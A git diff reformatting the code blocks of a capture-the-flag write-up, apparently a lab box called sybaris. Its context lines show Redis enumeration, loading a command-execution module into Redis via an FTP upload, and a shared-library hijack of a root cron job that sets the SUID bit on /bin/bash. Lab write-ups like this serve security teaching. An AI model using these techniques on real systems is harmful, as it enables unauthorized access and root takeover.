@@ -219,6 +219,9 @@ Allow: /themes/*/fonts/
 Allow: /content/images/*.jpg
 Allow: /content/images/*.png
 Allow: /content/images/*.gif
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ gobuster dir -u <http://$IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ===============================================================
@@ -298,6 +301,9 @@ To set redis-cli preferences:
       ":set hints" enable online hints
       ":set nohints" disable online hints
 Set your preferences in ~/.redisclirc
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sV --script redis-info -p 6379
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-16 03:14 UTC
@@ -342,7 +348,9 @@ remote: Compressing objects: 100% (17/17), done.
 remote: Total 494 (delta 101), reused 100 (delta 100), pack-reused 377 (from 1)
 Receiving objects: 100% (494/494), 203.32 KiB | 2.82 MiB/s, done.
 Resolving deltas: 100% (289/289), done.
+```
 
+```bash
 ┌──(kali㉿kali)-[~/Desktop/RedisModules-ExecuteCommand]
 └─$ sudo make          
 make -C ./src
@@ -379,7 +387,9 @@ In file included from module.c:4:
 ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc 
 make[1]: Leaving directory '/home/kali/Desktop/RedisModules-ExecuteCommand/src'
 cp ./src/module.so .
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/RedisModules-ExecuteCommand]
 └─$ ls
 LICENSE  Makefile  module.so  README.md  redismodule.h  rmutil  src
@@ -395,6 +405,9 @@ local: module.so remote: module.so
 100% |*********************************************************************************************| 47792      968.73 KiB/s    00:00 ETA
 226 Transfer complete.
 47792 bytes sent in 00:00 (238.81 KiB/s)
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/RedisModules-ExecuteCommand]
 └─$ redis-cli -h $IP
 192.168.108.93:6379> module load /var/ftp/pub/module.so
@@ -457,6 +470,9 @@ MAILTO=""
 # |  |  |  |  |
 # *  *  *  *  * user-name  command to be executed
   *  *  *  *  * root       /usr/bin/log-sweeper
+```
+
+```bash
 [pablo@sybaris tmp]$ log-sweeper
 log-sweeper: error while loading shared libraries: utils.so: cannot open shared object file: No such file or directory
 ```
@@ -478,13 +494,15 @@ void hijack() {
 	setgid(0);
 	system("chmod +s /bin/bash");
 }
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ gcc -o utils.so -shared -fPIC utils.c
 utils.c: In function ‘hijack’:
 utils.c:9:9: error: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
     9 |         setresuid(0,0,0);
       |         ^~~~~~~~~
-                
 ```
 
 After adding `#include <sys/types.h>` to fix compilation errors, I moved the library to the target directory.
@@ -503,9 +521,14 @@ void hijack() {
 	setuid(0);
 	system("chmod +s /bin/bash");
 }
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ gcc -o utils.so -shared -fPIC utils.c
+```
 
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ls -l utils.*
 -rw-rw-r-- 1 kali kali   238 Jan 16 06:13 utils.c
@@ -546,7 +569,9 @@ lrwxrwxrwx.  1 root root   9 Sep  4  2020 .bash_history -> /dev/null
 drwxr-----.  3 root root  19 Sep  4  2020 .pki
 -rw-------.  1 root root  33 Jan 15 23:02 proof.txt
 -rw-r--r--.  1 root root 129 Dec 28  2013 .tcshrc
+```
 
+```bash
 bash-4.2# cat proof.txt
 b6a...
 ```
